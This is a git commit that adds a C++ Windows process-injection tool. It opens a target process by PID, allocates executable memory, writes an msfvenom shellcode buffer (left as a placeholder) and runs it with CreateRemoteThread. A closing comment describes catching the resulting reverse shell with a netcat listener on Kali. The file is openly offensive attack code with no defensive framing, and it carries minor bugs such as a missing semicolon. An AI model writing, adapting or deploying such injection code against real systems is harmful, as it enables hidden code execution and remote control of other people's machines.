6123350d25d8868bb805dc9ba9fff05c7b28d983
Rev0x1337 <163394237+Rev0x1337@users.noreply.github.com>
2024-11-08 12:47:42 +0300

    Create injection_process.cpp

---
+++ injection/injection_process.cpp
@@ -0,0 +1,24 @@
+#include "stdafx.h"
+#include "Windows.h"
+
+int main(int argc, char *argv[]) {
+  unsigned char payload[] = "payload from msfvenom"
+
+  HANDLE processHandle;
+  HANDLE remoteThread;
+  PVOID remoteBuffer;
+
+  printf("Injecting to PID process: %1", atoi(argv[1]));
+  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof payload,(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  WriteProcessMemory(processHandle, remoteBuffer, payload, sizeof payload, NULL);
+  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+  CloseHandle(processHandle);
+
+  return 0;
+}
+
+/* Kali "nc -lvvp "port from payload"
+   Win "Injecting to PID process: №PID" 
+   
+   Kali shell :-) */
